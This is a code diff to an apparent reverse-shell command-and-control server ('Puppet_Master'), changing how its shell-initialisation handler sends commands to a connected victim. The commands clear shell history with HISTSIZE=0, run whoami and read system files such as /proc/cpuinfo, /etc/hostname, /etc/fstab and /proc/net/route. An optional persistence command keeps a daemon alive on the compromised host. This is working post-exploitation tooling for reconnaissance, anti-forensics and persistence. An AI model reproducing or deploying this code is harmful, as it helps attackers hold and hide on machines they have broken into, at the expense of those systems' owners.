@@ -84,19 +84,19 @@ async def handle_shell_init(reader, writer):
     randomStringInitEndSuffix = randomString()
     init_command = str()
     init_command += "export HISTSIZE=0;"
-    init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
-    init_command += f"echo {randomStringCPUinfoPrefix} && cat /proc/cpuinfo && echo {randomStringCPUinfoSuffix}\n"
-    init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix}\n"
-    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n"
-    writer.write( init_command.encode() )
-    await writer.drain()
+    init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix};"
+    init_command += f"echo {randomStringCPUinfoPrefix} && cat /proc/cpuinfo && echo {randomStringCPUinfoSuffix};"
+    init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix};"
+    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix};"
+    init_command += "\n"
 
     #如果持久化选项为True则执行deamon进程持久化命令
     if Puppet_Master.Persistence:
-        writer.write( Puppet_Master.PersistenceCommand.encode() + "\n".encode() )
-        await writer.drain()
+        init_command += Puppet_Master.PersistenceCommand + "\n"
+        
+    init_command += "echo {}\n".format(randomStringInitEndSuffix)
 
-    writer.write( f"echo {randomStringInitEndSuffix}\n".encode() )
+    writer.write( init_command.encode() )
     await writer.drain()
 
     while True:
